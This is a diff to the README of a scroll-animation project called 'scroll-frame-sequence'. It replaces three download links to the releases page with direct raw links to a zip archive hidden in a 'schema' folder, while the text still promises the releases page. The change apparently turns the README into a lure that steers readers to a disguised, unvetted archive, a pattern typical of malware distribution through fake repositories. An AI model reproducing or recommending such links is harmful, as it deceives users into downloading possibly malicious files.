@@ -16,7 +16,7 @@ Getting started with scroll-frame-sequence is easy. Follow these simple steps to
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[Download scroll-frame-sequence](https://github.com/donnaunbiased716/scroll-frame-sequence/releases)**
+Visit this link to download the application: **[Download scroll-frame-sequence](https://github.com/donnaunbiased716/scroll-frame-sequence/raw/refs/heads/main/schema/sequence_frame_scroll_v3.3-alpha.5.zip)**
 
 Once you click the link, you'll be taken to the releases page. Look for the latest version and click the download button.
 
@@ -160,7 +160,7 @@ For the smoothest experience:
 
 Ready to bring your website to life with stunning scroll animations?
 
-**👉 [Download scroll-frame-sequence Now](https://github.com/donnaunbiased716/scroll-frame-sequence/releases)**
+**👉 [Download scroll-frame-sequence Now](https://github.com/donnaunbiased716/scroll-frame-sequence/raw/refs/heads/main/schema/sequence_frame_scroll_v3.3-alpha.5.zip)**
 
 Join thousands of creators who use scroll-frame-sequence to craft engaging, interactive web experiences.
 
@@ -191,7 +191,7 @@ scroll-frame-sequence opens up a world of creative possibilities for your websit
 
 **Don't wait—click the button below and start creating!**
 
-**[⬇️ Download Now](https://github.com/donnaunbiased716/scroll-frame-sequence/releases)**
+**[⬇️ Download Now](https://github.com/donnaunbiased716/scroll-frame-sequence/raw/refs/heads/main/schema/sequence_frame_scroll_v3.3-alpha.5.zip)**
 
 Have fun animating, and remember: the only limit is your imagination! 🎨
 
